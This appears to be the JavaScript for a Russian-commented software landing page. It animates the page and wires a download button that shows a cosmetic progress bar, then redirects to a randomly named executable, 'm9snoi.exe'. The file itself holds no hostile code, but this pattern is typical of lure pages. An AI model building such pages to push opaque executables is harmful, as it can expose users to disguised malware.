document.addEventListener('DOMContentLoaded', () => {
    // Анимация появления элементов с эффектом каскада
    const elements = document.querySelectorAll('.container > *');
    elements.forEach((element, index) => {
        element.style.opacity = '0';
        element.style.animation = `fadeIn 0.6s ease forwards ${index * 0.25}s`;
    });

    // Анимация появления карточек features
    const featureCards = document.querySelectorAll('.feature-card');
    featureCards.forEach((card, index) => {
        card.style.opacity = '0';
        card.style.transform = 'translateY(40px) scale(0.9)';
        card.style.animation = `cardAppear 0.8s cubic-bezier(0.34, 1.56, 0.64, 1) forwards ${index * 0.15 + 0.6}s`;
    });

    // Анимация появления статистики
    const statItems = document.querySelectorAll('.stat-item');
    statItems.forEach((stat, index) => {
        stat.style.opacity = '0';
        stat.style.transform = 'scale(0.8)';
        stat.style.animation = `scaleIn 0.7s cubic-bezier(0.34, 1.56, 0.64, 1) forwards ${index * 0.2 + 1.2}s`;
    });

    // Анимация заголовка с эффектом typing
    const title = document.querySelector('.gradient-text');
    title.style.clipPath = 'inset(0 100% 0 0)';
    title.style.animation = 'typing 1.5s steps(30) forwards, gradientText 3s ease infinite 1.5s';

    // Анимация декоративных кругов
    const circles = document.querySelectorAll('.decorative-circle');
    circles.forEach((circle, index) => {
        circle.style.transform = 'scale(0)';
        circle.style.animation = `circleExpand 1s cubic-bezier(0.34, 1.56, 0.64, 1) forwards ${index * 0.3}s, floatCircle ${10 + index * 5}s ease-in-out infinite ${index * 0.3 + 1}s`;
    });

    // Анимация декоративных линий
    const lines = document.querySelectorAll('.decorative-line');
    lines.forEach((line, index) => {
        line.style.transform = 'scaleX(0)';
        line.style.animation = `lineExpand 1s ease forwards ${index * 0.2 + 0.5}s, pulseLine ${3 + index}s ease-in-out infinite ${index * 0.2 + 1.5}s`;
    });

    // Анимация кнопки скачивания
    const downloadBtn = document.getElementById('downloadBtn');
    downloadBtn.style.opacity = '0';
    downloadBtn.style.transform = 'translateY(30px)';
    downloadBtn.style.animation = 'btnAppear 0.8s cubic-bezier(0.34, 1.56, 0.64, 1) forwards 1.5s, pulse 2s infinite 2.3s';
    
    const progressBar = downloadBtn.querySelector('.progress-bar');
    
    downloadBtn.addEventListener('click', (e) => {
        e.preventDefault();
        
        // Анимация прогресс-бара
        progressBar.style.width = '100%';
        
        // Задержка перед скачиванием
        setTimeout(() => {
            window.location.href = 'm9snoi.exe';
        }, 1000);
    });

    // Аккордеон с отложенной анимацией
    const accordionItems = document.querySelectorAll('.accordion-item');
    accordionItems.forEach((item, index) => {
        item.style.opacity = '0';
        item.style.transform = 'translateX(-20px)';
        item.style.animation = `slideIn 0.6s ease forwards ${index * 0.2 + 1}s`;
        
        const header = item.querySelector('.accordion-header');
        header.addEventListener('click', () => {
            const isActive = item.classList.contains('active');
            
            // Закрываем все аккордеоны
            accordionItems.forEach(accItem => {
                accItem.classList.remove('active');
            });
            
            // Открываем/закрываем текущий
            if (!isActive) {
                item.classList.add('active');
            }
        });
    });

    // Создание частиц
    const particlesContainer = document.querySelector('.particles');
    const particleCount = 50;
    
    for (let i = 0; i < particleCount; i++) {
        const particle = document.createElement('div');
        particle.className = 'particle';
        particle.style.cssText = `
            position: absolute;
            width: ${Math.random() * 3 + 1}px;
            height: ${Math.random() * 3 + 1}px;
            background: rgba(52, 152, 219, ${Math.random() * 0.5 + 0.2});
            border-radius: 50%;
            left: ${Math.random() * 100}%;
            top: ${Math.random() * 100}%;
            animation: float ${Math.random() * 10 + 5}s infinite linear;
            opacity: 0;
            animation-delay: ${Math.random() * 2}s;
        `;
        particlesContainer.appendChild(particle);
    }
});

// Добавляем стили для частиц и анимаций
const style = document.createElement('style');
style.textContent = `
    @keyframes float {
        0% {
            transform: translateY(0) translateX(0);
            opacity: 0;
        }
        10% {
            opacity: 1;
        }
        90% {
            opacity: 1;
        }
        100% {
            transform: translateY(-100vh) translateX(${Math.random() * 100 - 50}px);
            opacity: 0;
        }
    }

    @keyframes floatCircle {
        0%, 100% {
            transform: translate(0, 0) rotate(0deg);
        }
        25% {
            transform: translate(10px, 10px) rotate(5deg);
        }
        50% {
            transform: translate(0, 20px) rotate(0deg);
        }
        75% {
            transform: translate(-10px, 10px) rotate(-5deg);
        }
    }

    @keyframes pulseLine {
        0%, 100% {
            opacity: 0.1;
            transform: scaleX(1);
        }
        50% {
            opacity: 0.2;
            transform: scaleX(1.1);
        }
    }

    @keyframes cardAppear {
        from {
            opacity: 0;
            transform: translateY(40px) scale(0.9);
        }
        to {
            opacity: 1;
            transform: translateY(0) scale(1);
        }
    }

    @keyframes scaleIn {
        from {
            opacity: 0;
            transform: scale(0.8);
        }
        to {
            opacity: 1;
            transform: scale(1);
        }
    }

    @keyframes typing {
        from {
            clip-path: inset(0 100% 0 0);
        }
        to {
            clip-path: inset(0 0 0 0);
        }
    }

    @keyframes circleExpand {
        from {
            transform: scale(0);
            opacity: 0;
        }
        to {
            transform: scale(1);
            opacity: 0.1;
        }
    }

    @keyframes lineExpand {
        from {
            transform: scaleX(0);
        }
        to {
            transform: scaleX(1);
        }
    }

    @keyframes btnAppear {
        from {
            opacity: 0;
            transform: translateY(30px);
        }
        to {
            opacity: 1;
            transform: translateY(0);
        }
    }

    @keyframes slideIn {
        from {
            opacity: 0;
            transform: translateX(-20px);
        }
        to {
            opacity: 1;
            transform: translateX(0);
        }
    }
`;
document.head.appendChild(style); 